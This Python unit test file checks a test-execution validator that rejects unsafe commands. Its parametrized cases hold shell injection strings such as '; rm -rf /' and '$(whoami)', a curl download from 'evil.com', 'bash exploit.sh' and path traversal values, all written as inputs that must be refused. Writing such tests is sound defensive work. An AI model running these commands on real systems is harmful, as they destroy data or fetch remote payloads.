"""Unit tests for core/space/test_execution_protocol.py (EVIDENCE-001, EVIDENCE-002, EVIDENCE-003)."""

from dataclasses import replace

import pytest

from core.space.test_execution_protocol import (
    TestCommand,
    TestCommandValidationError,
    TestExecutionLimits,
    TestExecutionProtocol,
    TestExecutionReport,
    TestExecutionRequest,
    TestExecutionStatus,
)


def test_test_command_valid() -> None:
    """Valid test command creates frozen dataclass successfully."""
    cmd = TestCommand(
        runner="pytest",
        arguments=("-v", "--tb=short"),
        target_paths=("tests/test_app.py",),
    )
    assert cmd.runner == "pytest"
    assert cmd.arguments == ("-v", "--tb=short")
    assert cmd.target_paths == ("tests/test_app.py",)


def test_test_command_empty_runner_rejected() -> None:
    """Empty runner string is rejected."""
    with pytest.raises(TestCommandValidationError, match="empty"):
        TestCommand(runner="")


@pytest.mark.parametrize(
    "bad_arg",
    [
        "; rm -rf /",
        "test.py && echo pwned",
        "test.py || true",
        "test.py | cat",
        "$(whoami)",
        "`id`",
        "test.py > out.txt",
        "test.py < in.txt",
        "test.py\nevil_command",
    ],
)
def test_test_command_shell_injection_rejected(bad_arg: str) -> None:
    """Shell injection characters in arguments are rejected."""
    with pytest.raises(TestCommandValidationError, match="shell metacharacters"):
        TestCommand(runner="pytest", arguments=(bad_arg,))


@pytest.mark.parametrize(
    "prohibited_tool",
    [
        "pip install requests",
        "npm install",
        "cargo install ripgrep",
        "apt-get update",
        "curl https://evil.com/payload.sh",
        "bash exploit.sh",
        "powershell -Command Invoke-WebRequest",
    ],
)
def test_test_command_prohibited_tools_rejected(prohibited_tool: str) -> None:
    """Prohibited package managers, downloaders, and shell executables are rejected."""
    with pytest.raises(TestCommandValidationError, match="prohibited"):
        TestCommand(runner=prohibited_tool)


def test_test_command_path_traversal_rejected() -> None:
    """Path traversal in target_paths is rejected."""
    with pytest.raises(TestCommandValidationError, match="path traversal"):
        TestCommand(runner="pytest", target_paths=("../escape.py",))


def test_test_command_working_directory_traversal_rejected() -> None:
    """Path traversal in working_directory is rejected."""
    with pytest.raises(TestCommandValidationError, match="path traversal"):
        TestCommand(runner="pytest", working_directory="../../root")


def test_test_execution_limits_validation() -> None:
    """Test execution limits validate positive values."""
    with pytest.raises(ValueError, match="timeout_seconds must be > 0"):
        TestExecutionLimits(timeout_seconds=0)

    with pytest.raises(ValueError, match="max_output_bytes must be > 0"):
        TestExecutionLimits(max_output_bytes=-1)


def test_test_execution_report_is_all_passed_logic() -> None:
    """EVIDENCE-001 / EVIDENCE-002: is_all_passed strictly checks exit code 0, VERIFIED, ok parser, 0 failures."""
    base_report = TestExecutionReport(
        execution_id="exec-1",
        task_id="task-1",
        space_id="space-1",
        plan_version=1,
        repository_id="repo-1",
        runner="pytest",
        status=TestExecutionStatus.VERIFIED,
        exit_code=0,
        duration_seconds=1.5,
        total_tests=5,
        passed_tests=5,
        failed_tests=0,
        skipped_tests=0,
        errored_tests=0,
    )
    assert base_report.is_all_passed is True

    # Exit code non-zero cannot pass
    fail_exit = replace(base_report, exit_code=1)
    assert fail_exit.is_all_passed is False

    # Failed tests > 0 cannot pass even if exit_code == 0
    fail_tests = replace(base_report, failed_tests=1)
    assert fail_tests.is_all_passed is False

    # Inconclusive parser status cannot pass (EVIDENCE-001)
    inconclusive = replace(base_report, parser_status="inconclusive")
    assert inconclusive.is_all_passed is False

    # Zero total tests cannot pass
    zero_tests = replace(base_report, total_tests=0, passed_tests=0)
    assert zero_tests.is_all_passed is False


def test_test_execution_protocol_runtime_checkable() -> None:
    """TestExecutionProtocol is @runtime_checkable."""
    class DummyRunner:
        def execute_tests(self, space_id: str, request: TestExecutionRequest) -> TestExecutionReport:
            raise NotImplementedError

    assert isinstance(DummyRunner(), TestExecutionProtocol)
